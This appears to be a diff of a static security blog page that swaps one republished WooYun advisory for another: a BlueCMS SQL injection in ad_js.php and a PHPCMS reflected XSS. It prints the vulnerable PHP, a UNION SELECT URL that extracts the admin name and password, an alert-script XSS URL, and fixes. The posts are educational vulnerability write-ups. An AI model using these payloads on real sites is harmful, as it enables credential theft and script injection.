@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" >
     <title>
         
-        BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞 · \xeb\xfe&#39;s Blog
+        PHPCMS通杀XSS-2010.08 · \xeb\xfe&#39;s Blog
         
     </title>
     <link rel="icon" href= /assests/favicon.ico>
@@ -118,7 +118,7 @@ white-space: pre;
                 <a href="/" >\xeb\xfe&#39;s Blog.</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞</a>
+                <a href="#" class="post-name">PHPCMS通杀XSS-2010.08</a>
             </div>
     </div>
     
@@ -139,7 +139,7 @@ white-space: pre;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞
+            PHPCMS通杀XSS-2010.08
             <!-- 404 -->
             
         </h1>
@@ -163,7 +163,7 @@ white-space: pre;
             
             <div class="post-intro-meta">
                 <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                <span class="post-intro-time">2017/12/07</span>
+                <span class="post-intro-time">2017/12/08</span>
             </div>
         
     </div>
@@ -234,31 +234,27 @@ white-space: pre;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <h3 id="漏洞代码-ad-js-php"><a href="#漏洞代码-ad-js-php" class="headerlink" title="漏洞代码(ad_js.php)"></a>漏洞代码(ad_js.php)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">define(<span class="string">'IN_BLUE'</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">require_once</span> dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/include/common.inc.php'</span>;</span><br><span class="line"></span><br><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($ad_id))</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Error!'</span>;</span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br><span class="line"><span class="keyword">if</span>($ad[<span class="string">'time_set'</span>] == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	$ad_content = $ad[<span class="string">'content'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>($ad[<span class="string">'end_time'</span>] &lt; time())</span><br><span class="line">	&#123;</span><br><span class="line">		$ad_content = $ad[<span class="string">'exp_content'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		$ad_content = $ad[<span class="string">'content'</span>];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$ad_content = str_replace(<span class="string">'"'</span>, <span class="string">'\"'</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">"\r"</span>, <span class="string">"\\r"</span>,$ad_content);</span><br><span class="line">$ad_content = str_replace(<span class="string">"\n"</span>, <span class="string">"\\n"</span>,$ad_content);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;!--\r\ndocument.write(\""</span>.$ad_content.<span class="string">"\");\r\n--&gt;\r\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>该代码判断ad_id值是否为空，不为空就对传入的ad_id值进行trim()去除头尾空格<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? trim($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure></p>
-<p>然后直接把传入的ad_id值，拼接进SQL语句中，进行查询<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad = $db-&gt;getone(<span class="string">"SELECT * FROM "</span>.table(<span class="string">'ad'</span>).<span class="string">" WHERE ad_id ="</span>.$ad_id);</span><br></pre></td></tr></table></figure></p>
-<p>因此存在SQL注入漏洞，用户可以构造SQL联合查询语句查询其他信息</p>
-<h3 id="example"><a href="#example" class="headerlink" title="example"></a>example</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/cms/ad_js.php?ad_id=1 and 1=2 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="keyword">concat</span>(admin_name,<span class="number">0x7C0D0A</span>,pwd),<span class="keyword">concat</span>(admin_name,<span class="number">0x7C0D0A</span>,pwd) <span class="keyword">from</span> blue_admin <span class="keyword">where</span> admin_id=<span class="number">1</span></span><br></pre></td></tr></table></figure>
-<h3 id="代码修复方案"><a href="#代码修复方案" class="headerlink" title="代码修复方案"></a>代码修复方案</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ad_id = !<span class="keyword">empty</span>($_GET[<span class="string">'ad_id'</span>]) ? intval($_GET[<span class="string">'ad_id'</span>]) : <span class="string">''</span>;</span><br></pre></td></tr></table></figure>
-<p>对用户输入的ad_id进行整数化</p>
-<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-0141.html" target="_blank" rel="noopener">BlueCMS v1.6 sp1 ad_js.php SQL注入漏洞</a></p>
+        <h3 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h3><p>在我要报错功能页下，过滤不严格，造成反射型XSS</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://**.**.**.**/error_report/error_report.php?title=1&amp;contentid=1"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(/xss/)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h3 id="修复方案："><a href="#修复方案：" class="headerlink" title="修复方案："></a>修复方案：</h3><p>输入输出前通过htmlspecialchars过滤，并过滤其他特殊字符</p>
+<p>原文链接：<a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2010-0289.html" target="_blank" rel="noopener">PHPCMS通杀XSS-2010.08</a></p>
 
     </article>
     <!-- 前后页  -->
     <ul class="post-pager">
         
             <li class="next">
-                <a href= "/2017/12/07/wooyun-1000php-2/" title= Discuz！7.2/X1 第三方心情墙插件SQL注入及持久型XSS漏洞 >
+                <a href= "/2017/12/08/wooyun-1000php-6/" title= phpcms 2008 sp4 爆路径及任意文件删除漏洞 >
                     <span>往前一页</span>
-                    <span>Discuz！7.2/X1 第三方心情墙插件SQL注入及持久型XSS漏洞</span>
+                    <span>phpcms 2008 sp4 爆路径及任意文件删除漏洞</span>
                 </a>
             </li>
         
         
             <li class="previous">
-                <a href= "/2017/11/26/hxctf2017-writeup/" title= hxctf2017-writeup >
+                <a href= "/2017/12/08/wooyun-1000php-4/" title= Discuz!漫游插件API本地包含漏洞 >
                     <span>往后一页</span>
-                    <span>hxctf2017-writeup</span>
+                    <span>Discuz!漫游插件API本地包含漏洞</span>
                 </a>
             </li>
         
@@ -321,7 +317,7 @@ white-space: pre;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞代码-ad-js-php"><span class="toc-number">1.</span> <span class="toc-text">漏洞代码(ad_js.php)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#example"><span class="toc-number">2.</span> <span class="toc-text">example</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#代码修复方案"><span class="toc-number">3.</span> <span class="toc-text">代码修复方案</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简要描述"><span class="toc-number">1.</span> <span class="toc-text">简要描述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复方案："><span class="toc-number">2.</span> <span class="toc-text">修复方案：</span></a></li></ol>
     </div>
     
     <div class="back-top">&#xe639;</div>
